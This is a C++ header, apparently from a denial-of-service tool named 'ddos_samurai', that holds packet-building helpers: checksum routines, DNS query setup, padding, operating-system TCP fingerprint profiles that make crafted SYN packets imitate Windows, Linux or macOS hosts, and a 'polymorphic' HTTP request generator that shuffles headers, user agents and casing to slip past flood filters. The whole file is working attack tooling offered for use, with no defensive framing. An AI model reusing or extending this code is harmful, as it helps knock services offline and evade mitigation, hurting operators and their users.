#pragma once

#include "engine.hpp"

#include <arpa/inet.h>
#include <netdb.h>
#include <sys/socket.h>
#include <unistd.h>

#include <algorithm>
#include <array>
#include <cctype>
#include <cstdlib>
#include <fstream>
#include <map>
#include <random>
#include <sstream>
#include <stdexcept>
#include <unordered_map>

namespace ddos_samurai::cpu_native::detail {

inline constexpr int ETHERTYPE_IPV4_LOCAL = 0x0800;
inline constexpr int ICMP_ECHO_REQUEST_LOCAL = 8;
inline constexpr uint16_t DNS_QUERY_FLAG_LOCAL = 0x0100;
inline constexpr uint16_t DNS_QR_QUERY_LOCAL = 0x0000;
inline constexpr uint16_t DNS_CLASS_IN_LOCAL = 1;

inline std::mt19937_64& rng() {
  thread_local std::mt19937_64 gen(std::random_device{}());
  return gen;
}

inline uint32_t rand_u32(uint32_t lo, uint32_t hi) {
  std::uniform_int_distribution<uint32_t> dist(lo, hi);
  return dist(rng());
}

inline int rand_int(int lo, int hi) {
  std::uniform_int_distribution<int> dist(lo, hi);
  return dist(rng());
}

inline void append_u8(std::vector<uint8_t>& out, uint8_t v) { out.push_back(v); }

inline void append_be16(std::vector<uint8_t>& out, uint16_t v) {
  out.push_back(static_cast<uint8_t>((v >> 8) & 0xFF));
  out.push_back(static_cast<uint8_t>(v & 0xFF));
}

inline void append_be32(std::vector<uint8_t>& out, uint32_t v) {
  out.push_back(static_cast<uint8_t>((v >> 24) & 0xFF));
  out.push_back(static_cast<uint8_t>((v >> 16) & 0xFF));
  out.push_back(static_cast<uint8_t>((v >> 8) & 0xFF));
  out.push_back(static_cast<uint8_t>(v & 0xFF));
}

inline void write_be16(std::vector<uint8_t>& out, size_t off, uint16_t v) {
  out.at(off) = static_cast<uint8_t>((v >> 8) & 0xFF);
  out.at(off + 1) = static_cast<uint8_t>(v & 0xFF);
}

inline uint16_t read_be16(const uint8_t* p) {
  return static_cast<uint16_t>((static_cast<uint16_t>(p[0]) << 8) | static_cast<uint16_t>(p[1]));
}

inline std::string to_lower(std::string value) {
  std::transform(value.begin(), value.end(), value.begin(), [](unsigned char c) {
    return static_cast<char>(std::tolower(c));
  });
  return value;
}

inline std::string to_upper(std::string value) {
  std::transform(value.begin(), value.end(), value.begin(), [](unsigned char c) {
    return static_cast<char>(std::toupper(c));
  });
  return value;
}

inline bool is_reserved_ipv4(uint32_t ip) {
  const uint8_t a = static_cast<uint8_t>((ip >> 24) & 0xFF);
  const uint8_t b = static_cast<uint8_t>((ip >> 16) & 0xFF);
  const uint8_t c = static_cast<uint8_t>((ip >> 8) & 0xFF);
  if (a == 0 || a == 10 || a == 127 || a >= 224) return true;
  if (a == 172 && b >= 16 && b <= 31) return true;
  if (a == 192 && b == 168) return true;
  if (a == 169 && b == 254) return true;
  if (a == 100 && b >= 64 && b <= 127) return true;
  if (a == 198 && (b == 18 || b == 19)) return true;
  if (a == 192 && b == 0) return true;
  if (a == 198 && b == 51 && c == 100) return true;
  if (a == 203 && b == 0 && c == 113) return true;
  return false;
}

inline std::vector<OSProfile> make_profiles() {
  return {
      {"windows_10", 128, 64240, {{TCP_OPT_MSS, 1460},
                                  {TCP_OPT_NOP, std::nullopt},
                                  {TCP_OPT_WSCALE, 8},
                                  {TCP_OPT_NOP, std::nullopt},
                                  {TCP_OPT_NOP, std::nullopt},
                                  {TCP_OPT_SACK_OK, std::nullopt}}},
      {"linux_5", 64, 29200, {{TCP_OPT_MSS, 1460},
                              {TCP_OPT_SACK_OK, std::nullopt},
                              {TCP_OPT_TIMESTAMP, std::nullopt},
                              {TCP_OPT_NOP, std::nullopt},
                              {TCP_OPT_WSCALE, 7}}},
      {"macos_14", 64, 65535, {{TCP_OPT_MSS, 1460},
                               {TCP_OPT_NOP, std::nullopt},
                               {TCP_OPT_WSCALE, 6},
                               {TCP_OPT_NOP, std::nullopt},
                               {TCP_OPT_NOP, std::nullopt},
                               {TCP_OPT_TIMESTAMP, std::nullopt},
                               {TCP_OPT_SACK_OK, std::nullopt},
                               {TCP_OPT_EOL, std::nullopt}}},
  };
}

inline const std::vector<OSProfile>& profiles_ref() {
  static const std::vector<OSProfile> profiles = make_profiles();
  return profiles;
}

inline const OSProfile& select_profile() {
  const auto& profiles = profiles_ref();
  const char* env = std::getenv("SAMURAI_CPU_FIXED_OS_PROFILE");
  if (env && env[0]) {
    const std::string wanted = to_lower(env);
    for (const auto& profile : profiles) {
      if (to_lower(profile.name) == wanted) return profile;
    }
  }
  return profiles.at(static_cast<size_t>(rand_int(0, static_cast<int>(profiles.size()) - 1)));
}

inline std::vector<uint8_t> bytes_from_string(const std::string& s) {
  return std::vector<uint8_t>(s.begin(), s.end());
}

inline std::vector<uint8_t> random_bytes(size_t n) {
  std::vector<uint8_t> out(n);
  for (auto& byte : out) byte = static_cast<uint8_t>(rand_int(0, 255));
  return out;
}

inline uint32_t pseudo_header_sum(uint32_t src_ip, uint32_t dst_ip, int protocol, uint16_t l4_len) {
  uint32_t s = 0;
  s += (src_ip >> 16) & 0xFFFF;
  s += src_ip & 0xFFFF;
  s += (dst_ip >> 16) & 0xFFFF;
  s += dst_ip & 0xFFFF;
  s += static_cast<uint32_t>(protocol & 0xFF);
  s += l4_len;
  return s;
}

inline uint16_t finalize_sum(uint32_t s) {
  while (s >> 16) s = (s & 0xFFFFu) + (s >> 16);
  return static_cast<uint16_t>((~s) & 0xFFFFu);
}

inline std::vector<uint8_t> profile_tcp_options(const OSProfile& profile) {
  std::vector<std::pair<int, std::optional<std::pair<uint32_t, uint32_t>>>> opts;
  opts.reserve(profile.tcp_options.size());
  for (const auto& [kind, value] : profile.tcp_options) {
    if (kind == TCP_OPT_TIMESTAMP) {
      opts.push_back({kind, std::make_pair(rand_u32(1, 0xFFFFFFFFu), 0u)});
    } else {
      opts.push_back({kind, value ? std::make_optional(std::make_pair(static_cast<uint32_t>(*value), 0u))
                                  : std::nullopt});
    }
  }
  return build_tcp_options(opts);
}

inline std::string choose_dns_qtype(const PacketConfig& cfg) {
  if (cfg.dns_qtypes.empty()) return "A";
  if (cfg.dns_qtypes.size() == 1) return cfg.dns_qtypes.front();
  return cfg.dns_qtypes.at(static_cast<size_t>(rand_int(0, static_cast<int>(cfg.dns_qtypes.size()) - 1)));
}

inline std::vector<uint8_t> maybe_pad(std::vector<uint8_t> packet, int pad_size, bool is_syn_only) {
  if (!is_syn_only && pad_size > 0 && static_cast<int>(packet.size()) < pad_size) {
    packet.resize(static_cast<size_t>(pad_size), 0);
  }
  return packet;
}

inline std::vector<uint8_t> polymorphic_http_payload(const std::string& target_ip,
                                                     const std::string& path,
                                                     const std::string& method) {
  static const std::vector<std::string> agents = {
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Safari/604.1",
  };
  std::vector<std::pair<std::string, std::string>> headers = {
      {"Host", target_ip},
      {"User-Agent", agents.at(static_cast<size_t>(rand_int(0, static_cast<int>(agents.size()) - 1)))},
      {"Accept", "*/*"},
      {"Accept-Language",
       std::array<std::string, 3>{"en-US,en;q=0.5", "tr-TR,tr;q=0.9", "de-DE,de;q=0.8"}.at(
           static_cast<size_t>(rand_int(0, 2)))},
      {"Accept-Encoding", "gzip, deflate, br"},
      {"Connection", std::array<std::string, 2>{"keep-alive", "close"}.at(static_cast<size_t>(rand_int(0, 1)))},
      {"Upgrade-Insecure-Requests", "1"},
      {"Cache-Control", std::array<std::string, 2>{"max-age=0", "no-cache"}.at(static_cast<size_t>(rand_int(0, 1)))},
  };
  std::shuffle(headers.begin(), headers.end(), rng());
  std::ostringstream oss;
  oss << method << ' ' << path << " HTTP/1.1\r\n";
  for (auto [key, value] : headers) {
    if (rand_int(0, 1) == 1) key = to_lower(key);
    oss << key << ": " << value << "\r\n";
  }
  oss << "\r\n";
  return bytes_from_string(oss.str());
}

}  // namespace ddos_samurai::cpu_native::detail
